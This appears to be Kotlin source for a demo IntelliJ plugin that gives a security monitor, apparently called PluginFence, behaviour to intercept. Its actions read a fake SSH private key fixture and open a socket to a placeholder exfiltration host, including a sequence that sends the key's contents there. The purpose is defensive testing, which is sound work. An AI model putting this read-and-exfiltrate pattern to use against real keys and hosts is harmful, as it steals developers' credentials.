package com.example.demohelper

import com.intellij.openapi.actionSystem.AnActionEvent
import com.intellij.openapi.application.ApplicationManager
import com.intellij.openapi.project.DumbAwareAction
import java.net.InetSocketAddress
import java.net.Socket
import java.nio.file.Files

// Demo Helper 1.1.0 only. These actions exist so PluginFence has something real to intercept.
// Targets are fixtures and documentation-only addresses; nothing sensitive is ever touched.

/** Reads the fake SSH private key fixture (demo-fixtures/home/.ssh/id_rsa). */
class AttemptSecretReadAction : DumbAwareAction() {
    override fun actionPerformed(e: AnActionEvent) = attemptSecretRead()
}

/** Opens a socket to a non-routable TEST-NET address, as an exfiltration attempt would. */
class AttemptNetworkExfiltrationAction : DumbAwareAction() {
    override fun actionPerformed(e: AnActionEvent) = attemptExfiltration()
}

/** Launches a harmless process: the IDE's own `java -version`. */
class AttemptProcessExecutionAction : DumbAwareAction() {
    override fun actionPerformed(e: AnActionEvent) = attemptProcess()
}

/** Secret read, then - within the correlation window - a brand new outbound connection. */
class RunAttackSequenceAction : DumbAwareAction() {
    override fun actionPerformed(e: AnActionEvent) {
        ApplicationManager.getApplication().executeOnPooledThread {
            DemoSupport.log("> Attack sequence: read credential, then exfiltrate")
            var stolen: String? = null
            try {
                stolen = Files.readString(DemoSupport.fakeSshKey())
                DemoSupport.log("  step 1 read ${DemoSupport.fakeSshKey()} (${stolen.length} chars)")
            } catch (ex: SecurityException) {
                DemoSupport.log("  step 1 DENIED: ${ex.message}")
            } catch (ex: Exception) {
                DemoSupport.log("  step 1 FAILED: ${ex.javaClass.simpleName}: ${ex.message}")
            }
            Thread.sleep(600)
            try {
                Socket().use { socket ->
                    socket.connect(InetSocketAddress(DemoSupport.EXFIL_HOST, DemoSupport.EXFIL_PORT), 1500)
                    if (stolen != null) socket.getOutputStream().write(stolen.toByteArray())
                }
                DemoSupport.log("  step 2 connected to ${DemoSupport.EXFIL_HOST}:${DemoSupport.EXFIL_PORT}")
            } catch (ex: SecurityException) {
                DemoSupport.log("  step 2 DENIED: ${ex.message}")
            } catch (ex: Exception) {
                DemoSupport.log("  step 2 FAILED: ${ex.javaClass.simpleName}: ${ex.message}")
            }
        }
    }
}

private fun attemptSecretRead() {
    DemoSupport.attempt("Read fake SSH key ${DemoSupport.fakeSshKey()}") {
        val text = Files.readString(DemoSupport.fakeSshKey())
        "read ${text.length} chars"
    }
}

private fun attemptExfiltration() {
    DemoSupport.attempt("Connect to ${DemoSupport.EXFIL_HOST}:${DemoSupport.EXFIL_PORT}") {
        Socket().use { socket ->
            socket.connect(InetSocketAddress(DemoSupport.EXFIL_HOST, DemoSupport.EXFIL_PORT), 1500)
        }
        "connected"
    }
}

private fun attemptProcess() {
    DemoSupport.attempt("Launch process: java -version") {
        val process = ProcessBuilder(DemoSupport.javaExecutable(), "-version").redirectErrorStream(true).start()
        val output = process.inputStream.use { String(it.readAllBytes()) }.lineSequence().firstOrNull() ?: ""
        process.waitFor()
        "exit ${process.exitValue()}: $output"
    }
}
